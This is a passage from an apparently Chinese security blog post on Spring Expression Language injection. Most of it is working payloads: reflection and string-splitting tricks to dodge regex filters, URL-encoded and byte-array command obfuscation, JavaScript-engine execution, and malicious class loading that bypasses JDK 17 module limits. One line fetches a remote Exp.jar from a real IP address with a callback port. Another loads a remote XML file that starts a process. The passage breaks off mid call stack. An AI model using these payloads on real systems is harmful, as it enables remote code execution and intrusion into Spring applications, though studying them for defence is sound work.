反射调用+字符串拼接，绕过如javacon题目中的正则过滤</span></span><br><span class="line">T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;ex&quot;</span>+<span class="string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;getRu&quot;</span>+<span class="string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>)),<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/C&quot;</span>,<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 同上，需要有上下文环境</span></span><br><span class="line">#<span class="built_in">this</span>.getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;ex&quot;</span>+<span class="string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;getRu&quot;</span>+<span class="string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>)),<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/C&quot;</span>,<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part1</span></span><br><span class="line"><span class="comment">// byte数组内容的生成后面有脚本</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">99</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">99</span>&#125;)).start()</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part2</span></span><br><span class="line"><span class="comment">// byte数组内容的生成后面有脚本</span></span><br><span class="line">T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(<span class="number">99</span>).concat(T(java.lang.Character).toString(<span class="number">97</span>)).concat(T(java.lang.Character).toString(<span class="number">108</span>)).concat(T(java.lang.Character).toString(<span class="number">99</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 命令执行带回显</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(<span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;whoami&quot;</span>).start().getInputStream())).readLine()</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(T(java.lang.Runtime).getRuntime().exec(<span class="string">&quot;whoami&quot;</span>).getInputStream(), <span class="string">&quot;GBK&quot;</span>).useDelimiter(<span class="string">&quot;xxx&quot;</span>).next()</span><br></pre></td></tr></table></figure></div>

<h3 id="结合-JS-引擎-1"><a href="#结合-JS-引擎-1" class="headerlink" title="结合 JS 引擎"></a>结合 JS 引擎</h3><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JavaScript引擎通用PoC</span></span><br><span class="line">T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">&quot;nashorn&quot;</span>).eval(<span class="string">&quot;s=[3];s[0]=&#x27;cmd&#x27;;s[1]=&#x27;/C&#x27;;s[2]=&#x27;calc&#x27;;java.la&quot;</span>+<span class="string">&quot;ng.Run&quot;</span>+<span class="string">&quot;time.getRu&quot;</span>+<span class="string">&quot;ntime().ex&quot;</span>+<span class="string">&quot;ec(s);&quot;</span>)</span><br><span class="line"> </span><br><span class="line">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">&quot;JavaScript&quot;</span>).eval(<span class="string">&quot;xxx&quot;</span>),)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// JavaScript引擎+反射调用</span></span><br><span class="line">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">&quot;JavaScript&quot;</span>).eval(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;ex&quot;</span>+<span class="string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;getRu&quot;</span>+<span class="string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>)),<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/C&quot;</span>,<span class="string">&quot;calc&quot;</span>&#125;)),)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// JavaScript引擎+URL编码</span></span><br><span class="line"><span class="comment">// 其中URL编码内容为：</span></span><br><span class="line"><span class="comment">// 不加最后的getInputStream()也行，因为弹计算器不需要回显</span></span><br><span class="line">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">&quot;JavaScript&quot;</span>).eval(T(java.net.URLDecoder).decode(<span class="string">&quot;%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29&quot;</span>)),)</span><br></pre></td></tr></table></figure></div>

<h3 id="类加载攻击"><a href="#类加载攻击" class="headerlink" title="类加载攻击"></a>类加载攻击</h3><h4 id="UrlClassloader"><a href="#UrlClassloader" class="headerlink" title="UrlClassloader"></a>UrlClassloader</h4><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.net.URLClassLoader(<span class="keyword">new</span> <span class="title class_">java</span>.net.URL[]&#123;<span class="keyword">new</span> <span class="title class_">java</span>.net.URL(<span class="string">&quot;http://101.36.122.13:8990/Exp.jar&quot;</span>)&#125;).loadClass(<span class="string">&quot;Exp&quot;</span>).getConstructors()[<span class="number">0</span>].newInstance(<span class="string">&quot;101.36.122.13:2333&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<h4 id="ReflectUtils"><a href="#ReflectUtils" class="headerlink" title="ReflectUtils"></a>ReflectUtils</h4><p>Spring 框架中 <code>org.springframework.cglib.core.ReflectUtils</code> 提供了一系列反射有关的方法，其中就包括了字节码加载 <code>defineClass</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">byte</span>[] bytes = getEvilClass(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;T(org.springframework.cglib.core.ReflectUtils).defineClass(&#x27;EvilClass&#x27;,T(org.springframework.util.Base64Utils).decodeFromString(&#x27;&quot;</span> + s + <span class="string">&quot;&#x27;),T(java.lang.Thread).currentThread().getContextClassLoader()).newInstance()&quot;</span>;</span><br><span class="line">    System.out.println(cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getEvilClass(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;EvilClass&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, ctClass);</span><br><span class="line">    constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;);&quot;</span>);</span><br><span class="line">    ctClass.addConstructor(constructor);</span><br><span class="line">    ctClass.getClassFile().setMajorVersion(<span class="number">49</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>高版本 JDK（&gt;&#x3D;9）引入了命名模块机制，<code>java.*</code> 下的非公开变量和方法不能被其他模块直接访问，JDK11 还只会提示 warning，而在 JDK17 中会强制开启，直接报错：</p>
<blockquote>
<p>java.lang.reflect.InaccessibleObjectException: Unable to make protected final java.lang.Class java.lang.ClassLoader.defineClass(java.lang.String,byte[],int,int,java.security.ProtectionDomain) throws java.lang.ClassFormatError accessible: module java.base does not “opens java.lang” to unnamed module @635eaaf1</p>
</blockquote>
<p>这是因为 <code>java.lang.ClassLoader#defineClass</code> 不是公开方法，无法被其他模块访问。</p>
<p>当然 Spring 也提供了相应的解决方案，就是不再硬反射 <code>defineClass</code>，而是走 <strong>方法句柄 API</strong> 的“官方通道”来把字节码变成类：</p>
<ul>
<li>先拿一张<strong>通行证</strong>（<code>Lookup</code>）：<br><code>lookup = MethodHandles.privateLookupIn(contextClass, MethodHandles.lookup())</code></li>
<li>再用这张通行证把字节码<strong>定义成类</strong>：<br><code>clazz = lookup.defineClass(bytes)</code></li>
</ul>
<p>这样做就能在 <strong><code>contextClass</code> 的同包、同类加载器</strong> 下定义新类，<strong>绕开模块限制</strong>，不用 <code>--add-opens</code>。</p>
<p><code>org.springframework.cglib.core.ReflectUtils#defineClass</code> 函数在满足条件的时候会优先调用 <code>java.lang.invoke.MethodHandles$Lookup#defineClass</code> 来加载类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 首选路径：在 JDK 9+ 上，如果类加载器匹配，则用 Lookup#defineClass 定义类</span></span><br><span class="line"><span class="comment">// （避免直接反射 ClassLoader#defineClass 触发模块化的访问限制）</span></span><br><span class="line"><span class="keyword">if</span> (contextClass != <span class="literal">null</span>                                  <span class="comment">// 必须提供上下文类：用于定位包名/类加载器</span></span><br><span class="line">    &amp;&amp; contextClass.getClassLoader() == loader            <span class="comment">// ★关键：要求与目标 loader 完全相同，才能 privateLookupIn</span></span><br><span class="line">    &amp;&amp; privateLookupInMethod != <span class="literal">null</span>                      <span class="comment">// 反射拿到 MethodHandles#privateLookupIn（JDK9 提供）</span></span><br><span class="line">    &amp;&amp; lookupDefineClassMethod != <span class="literal">null</span>) &#123;                 <span class="comment">// 反射拿到 MethodHandles.Lookup#defineClass（JDK9 提供）</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 构造一个针对 contextClass 的“私有” Lookup（拥有其宿主类同等的访问权限，含同包私有）</span></span><br><span class="line">        MethodHandles.<span class="type">Lookup</span> <span class="variable">lookup</span> <span class="operator">=</span> (MethodHandles.Lookup)</span><br><span class="line">            privateLookupInMethod.invoke(</span><br><span class="line">                <span class="literal">null</span>,                                     <span class="comment">// 静态方法 MethodHandles.privateLookupIn(...)</span></span><br><span class="line">                contextClass,                             <span class="comment">// 目标/宿主类（决定包与可见性边界）</span></span><br><span class="line">                MethodHandles.lookup()                    <span class="comment">// 作为“调用者”的 lookup（当前类的 lookup）</span></span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 用该 Lookup 直接把字节码 b 定义成一个类（等价于在 contextClass 所在包里 define）</span></span><br><span class="line">        <span class="comment">// 要求：b 中 class 的内部名与期望一致，且包名与 contextClass 相同</span></span><br><span class="line">        c = (Class) lookupDefineClassMethod.invoke(lookup, b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里需要满足如下条件：</p>
<ul>
<li><strong>JDK ≥ 9</strong>：运行时必须有 <code>MethodHandles.privateLookupIn</code> 与 <code>MethodHandles.Lookup#defineClass(byte[])</code><br>→ 代码里用 <code>privateLookupInMethod != null &amp;&amp; lookupDefineClassMethod != null</code> 检测。</li>
<li><strong>提供了上下文类</strong>：<code>contextClass != null</code><br>→ 用它来确定“目标包”和“目标类加载器”。</li>
<li><strong>类加载器完全一致</strong>：<code>contextClass.getClassLoader() == loader</code>（★关键）<br>→ 只有 loader 一致才能 <code>privateLookupIn(contextClass, …)</code>，也才能把新类<strong>定义到与 contextClass 同一个运行时包&#x2F;模块</strong>里。</li>
</ul>
<p>当满足这些条件的时候首先调用 <code>MethodHandles.privateLookupIn</code> 函数创建一个<strong>绑定到 <code>contextClass</code> 的 Lookup 对象</strong>。这个 Lookup 代表“以 <code>contextClass</code> 所在<strong>运行时包</strong>与<strong>类加载器</strong>的权限视角”去做后续操作（比如 <code>lookup.defineClass(bytes)</code>）。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MethodHandles.<span class="type">Lookup</span> <span class="variable">lookup</span> <span class="operator">=</span> (MethodHandles.Lookup)</span><br><span class="line">    privateLookupInMethod.invoke(<span class="literal">null</span>, contextClass, MethodHandles.lookup());</span><br></pre></td></tr></table></figure></div>

<p>等价于（非反射写法）：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MethodHandles.<span class="type">Lookup</span> <span class="variable">lookup</span> <span class="operator">=</span></span><br><span class="line">    MethodHandles.privateLookupIn(contextClass, MethodHandles.lookup());</span><br></pre></td></tr></table></figure></div>

<p>之后调用 <code>lookup.defineClass</code> <strong>在 <code>contextClass</code> 的地盘里</strong>把字节码变成类，也就是把 <code>b</code>（合法的 class 文件字节）定义成一个 <code>Class</code>，<strong>落在与 <code>contextClass</code> 完全一致的包&#x2F;类加载器&#x2F;保护域</strong>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; c = (Class) lookupDefineClassMethod.invoke(lookup, b);</span><br></pre></td></tr></table></figure></div>

<p>等价于（非反射写法）：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; c = lookup.defineClass(b);</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <p><strong>不会立刻执行 <code>&lt;clinit&gt;</code>（静态代码块）</strong>；初始化按 JLS 规则稍后触发。</p>

    </div>
  </div>

<p>因此我们可以通过调用 <code>org.springframework.cglib.core.ReflectUtils#defineClass</code> 加载恶意类，并且满足：</p>
<ul>
<li><strong><code>contextClass</code> 与目标新类在同一个“运行时包”</strong>：包名要完全一致（例如都在 <code>org.springframework.expression</code>，<strong>子包不算同包</strong>！<code>org.springframework.expression.spel.*</code> 就不行）。</li>
<li><strong><code>contextClass</code> 与目标新类由同一个类加载器加载</strong>：<code>contextClass.getClassLoader()</code> 必须等于你传给 <code>ReflectUtils#defineClass</code> 的 <code>loader</code>。</li>
</ul>
<p>例如我们只需要将 <code>contextClass</code> 设置为 <code>org.springframework.expression.ExpressionParser</code> 并且要加载的类的类名设置为 <code>org.springframework.expression</code> 下的任意一个虚构的类即可：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">fqcn</span> <span class="operator">=</span> <span class="string">&quot;org.springframework.expression.EvilClass_&quot;</span> +</span><br><span class="line">            UUID.randomUUID().toString().replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">byte</span>[] bytes = buildClazzBytesWithClinit(fqcn, <span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">b64</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(bytes);</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">spel</span> <span class="operator">=</span> <span class="string">&quot;T(org.springframework.cglib.core.ReflectUtils).defineClass(&quot;</span></span><br><span class="line">            + <span class="string">&quot;&#x27;&quot;</span> + fqcn + <span class="string">&quot;&#x27;,&quot;</span></span><br><span class="line">            + <span class="string">&quot;T(java.util.Base64).getDecoder().decode(&#x27;&quot;</span> + b64 + <span class="string">&quot;&#x27;),&quot;</span></span><br><span class="line">            + <span class="string">&quot;T(org.springframework.expression.ExpressionParser).getClassLoader(),&quot;</span> <span class="comment">// 同 loader</span></span><br><span class="line">            + <span class="string">&quot;null,&quot;</span></span><br><span class="line">            + <span class="string">&quot;T(org.springframework.expression.ExpressionParser)&quot;</span>                   <span class="comment">// 同包的 contextClass</span></span><br><span class="line">            + <span class="string">&quot;)&quot;</span>;</span><br><span class="line"></span><br><span class="line">    System.out.println(spel);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="type">byte</span>[] buildClazzBytesWithClinit(String fqcn, String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(fqcn);</span><br><span class="line"></span><br><span class="line">    cc.makeClassInitializer().setBody(<span class="string">&quot;&#123; java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;); &#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    cc.getClassFile().setMajorVersion(<span class="number">52</span>);</span><br><span class="line">    <span class="keyword">return</span> cc.toBytecode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>调用栈如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">exec:315, Runtime (java.lang)</span><br><span class="line">&lt;clinit&gt;:-1, EvilInterceptor_9dd7c55669134ec4819a0eb7653eb98d (org.springframework.expression)</span><br><span class="line">forName0:-1, Class (java.lang)</span><br><span class="line">forName:467, Class (java.lang)</span><br><span class="line">defineClass:604, ReflectUtils (org.springframework.cglib.core)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (jdk.internal.reflect)</span><br><span class="line">invoke:77, NativeMethodAccessorImpl (jdk.internal.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (jdk.internal.reflect)</span><br><span class="line">invoke:568, Method (java.lang.reflect)</span><br><span class="line">execute:139, ReflectiveMethodExecutor (org.springframework.expression.spel.support)</span><br><span class="line">getValueInternal:139, MethodReference (org.springframework.expression.spel.ast)</span><br><span class="line">access$000:55, MethodReference (org.springframework.expression.spel.ast)</span><br><span class="line">getValue:383, MethodReference$MethodValueRef (org.springframework.expression.spel.ast)</span><br><span class="line">getValueInternal:93, CompoundExpression (org.springframework.expression.spel.ast)</span><br><span class="line">getValue:114, SpelNodeImpl (org.springframework.expression.spel.ast)</span><br><span class="line">getValue:142, SpelExpression (org.springframework.expression.spel.standard)</span><br><span class="line">spel:14, SpELController (com.example.speldemo)</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>上述方式有时会出现如下错误：</p>
<blockquote>
<p>loader ‘app’ attempted duplicate class definition for org.springframework.expression.EvilClass. (org.springframework.expression.EvilInterceptor is in unnamed module of loader ‘app’)</p>
</blockquote>
<p>这实际上是 <strong>JVM 的硬错误</strong>：同一个 <strong>ClassLoader</strong> 里，<strong>同名类（同一 FQCN）只能被定义一次</strong>。<br>日志里说的 <code>loader &#39;app&#39;</code>（你的 WebAppClassLoader）<strong>之前已经加载过</strong><br><code>org.springframework.expression.EvilClass</code>，你又尝试用同名再定义。</p>
<p>因此我们需要每次更换类名：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">fqcn</span> <span class="operator">=</span> <span class="string">&quot;org.springframework.expression.EvilClass_&quot;</span> +</span><br><span class="line">            UUID.randomUUID().toString().replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<h3 id="远程加载-xml"><a href="#远程加载-xml" class="headerlink" title="远程加载 xml"></a>远程加载 xml</h3><p><code>javax.swing.plaf.synth.SynthLookAndFeel#load</code></p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">javax</span>.swing.plaf.synth.SynthLookAndFeel().load(<span class="keyword">new</span> <span class="title class_">java</span>.net.URL(<span class="string">&quot;http://127.0.0.1:8000/1.xml&quot;</span>))</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">new</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">object</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">new</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li><p><code>SpELController.spel → SpelExpression.getValue → MethodReference.execute</code></p>
<ul>
<li>你在 URL 里传的 SpEL：<br><code>new javax.swing.plaf.synth.SynthLookAndFeel().load(new java.net.URL(&quot;http://.../1.xml&quot;))</code></li>
<li>SpEL 解析后<strong>真的 new</strong> 了 <code>SynthLookAndFeel</code>，并调用了 <code>.load(URL)</code>。</li>
</ul>
</li>
<li><p><code>SynthLookAndFeel.load</code></p>
<ul>
<li>内部做两件事：<code>url.openStream()</code> 读回 XML，交给 <code>new SynthParser().parse(...)</code>。</li>
</ul>
</li>
<li><p><code>SAXParser.parse → AbstractSAXParser.parse → XML11Configuration.parse</code> 等</p>
<ul>
<li>标准 JAXP&#x2F;Xerces 把 XML 逐标签回调给 <code>SynthParser</code>。</li>
</ul>
</li>
<li><p><code>SynthParser.endElement</code></p>
<ul>
<li>每读到一个结束标签（如 <code>&lt;/new&gt;</code> &#x2F; <code>&lt;/object&gt;</code>），就驱动语义处理——核心是 <strong>com.sun.beans.decoder</strong> 包。</li>
</ul>
</li>
</ul>
<p>这套 <strong>JavaBeans XML Decoder</strong> 语法就是为了把 XML <strong>解释成对象构建与方法调用</strong>：</p>
<ul>
<li><p><code>NewElementHandler.getValueObject / getContextBean</code></p>
<ul>
<li><p>解析 <code>&lt;new class=&quot;java.lang.ProcessBuilder&quot;&gt; … &lt;/new&gt;</code></p>
</li>
<li><p>先把子节点 <code>&lt;string&gt;calc&lt;/string&gt;</code> 解析成构造参数；</p>
</li>
<li><p>找到匹配的构造器后：</p>
<ul>
<li><code>Constructor.newInstance(...) → NativeConstructorAccessorImpl.newInstance0</code></li>
<li>**到这就真正调用了 <code>ProcessBuilder.&lt;init&gt;(&quot;calc&quot;)</code>**（你看到的栈顶：<code>&lt;init&gt;:229, ProcessBuilder</code>）</li>
</ul>
</li>
</ul>
</li>
<li><p><code>ObjectElementHandler.getValueObject</code></p>
<ul>
<li>解析 <code>&lt;object method=&quot;start&quot;&gt;&lt;/object&gt;</code>；</li>
<li>反射找到 <code>start()</code>，再 <code>Method.invoke(...)</code> 调用；</li>
<li>**相当于 <code>new ProcessBuilder(&quot;calc&quot;).start()</code>**，进程被拉起。</li>
</ul>
</li>
</ul>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;:229, ProcessBuilder (java.lang)</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (jdk.internal.reflect)</span><br><span class="line">newInstance:77, NativeConstructorAccessorImpl (jdk.internal.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (jdk.internal.reflect)</span><br><span class="line">newInstanceWithCaller:499, Constructor (java.lang.reflect)</span><br><span class="line">newInstance:480, Constructor (java.lang.reflect)</span><br><span class="line">getValueObject:156, NewElementHandler (com.sun.beans.decoder)</span><br><span class="line">getValueObject:123, NewElementHandler (com.sun.beans.decoder)</span><br><span 